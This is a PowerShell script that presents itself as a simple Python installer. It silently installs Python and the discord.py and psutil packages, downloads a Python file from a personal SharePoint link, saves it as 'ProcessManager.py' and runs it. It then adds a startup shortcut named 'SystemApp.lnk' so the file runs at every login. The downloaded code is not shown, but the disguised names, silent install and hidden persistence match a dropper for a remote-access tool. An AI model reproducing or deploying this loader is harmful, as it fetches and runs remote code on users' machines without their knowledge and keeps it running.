# Simple Python and Script Installer - Fixed Version
Write-Host "Starting setup process..." -ForegroundColor Cyan

# Simple Python check that always works
try {
    $null = cmd /c "python --version" 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Host "Python is installed" -ForegroundColor Green
        $hasPython = $true
    } else {
        $hasPython = $false
    }
} catch {
    $hasPython = $false
}

# Install Python if needed
if (-not $hasPython) {
    Write-Host "Installing Python..." -ForegroundColor Yellow
    
    # Download Python
    $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
    $installerPath = "$env:TEMP\python_setup.exe"
    
    try {
        (New-Object System.Net.WebClient).DownloadFile($pythonUrl, $installerPath)
        Write-Host "Python downloaded" -ForegroundColor Green
    } catch {
        Write-Host "Download failed, trying different method..." -ForegroundColor Yellow
        # Try alternate download method
        Import-Module BitsTransfer
        Start-BitsTransfer -Source $pythonUrl -Destination $installerPath
    }
    
    # Install Python
    Write-Host "Installing Python (this may take a moment)..." -ForegroundColor Yellow
    $process = Start-Process -FilePath $installerPath -ArgumentList @(
        "/quiet",
        "InstallAllUsers=0",
        "PrependPath=1",
        "Include_test=0", 
        "Include_pip=1",
        "Include_launcher=0"
    ) -Wait -PassThru
    
    if ($process.ExitCode -eq 0) {
        Write-Host "Python installed successfully" -ForegroundColor Green
        # Wait for installation to complete
        Start-Sleep -Seconds 8
    } else {
        Write-Host "Python installation may have issues, but continuing..." -ForegroundColor Yellow
    }
}

# Install packages
Write-Host "Installing required packages..." -ForegroundColor Yellow
try {
    Start-Process -FilePath "python" -ArgumentList "-m", "pip", "install", "discord.py", "psutil", "--user", "--quiet" -Wait
    Write-Host "Packages installed" -ForegroundColor Green
} catch {
    Write-Host "Package installation had issues, but continuing..." -ForegroundColor Yellow
}

# Download main script
Write-Host "Downloading application..." -ForegroundColor Yellow
$scriptUrl = "https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=PanmFy&download=1"
$scriptPath = "$env:USERPROFILE\ProcessManager.py"

try {
    (New-Object System.Net.WebClient).DownloadFile($scriptUrl, $scriptPath)
    Write-Host "Application downloaded to: $scriptPath" -ForegroundColor Green
} catch {
    Write-Host "Download failed, trying alternate method..." -ForegroundColor Yellow
    try {
        Import-Module BitsTransfer
        Start-BitsTransfer -Source $scriptUrl -Destination $scriptPath
        Write-Host "Application downloaded" -ForegroundColor Green
    } catch {
        Write-Host "Failed to download application" -ForegroundColor Red
        exit 1
    }
}

# Run the script
Write-Host "Starting application..." -ForegroundColor Green
try {
    Start-Process -FilePath "python" -ArgumentList "`"$scriptPath`""
    Write-Host "Application started" -ForegroundColor Green
} catch {
    Write-Host "Failed to start application, but setup completed" -ForegroundColor Yellow
}

# Add to startup
Write-Host "Setting up startup..." -ForegroundColor Yellow
try {
    $startupPath = [Environment]::GetFolderPath("Startup")
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut("$startupPath\SystemApp.lnk")
    $Shortcut.TargetPath = "python"
    $Shortcut.Arguments = "`"$scriptPath`""
    $Shortcut.WorkingDirectory = "$env:USERPROFILE"
    $Shortcut.Save()
    Write-Host "Startup configured successfully" -ForegroundColor Green
} catch {
    Write-Host "Startup configuration failed, but application is running" -ForegroundColor Yellow
}

Write-Host "=== Setup Completed ===" -ForegroundColor Green
Write-Host "Application will start automatically on next login" -ForegroundColor Cyan
Write-Host "This window will close in 5 seconds..." -ForegroundColor Yellow
Start-Sleep -Seconds 5
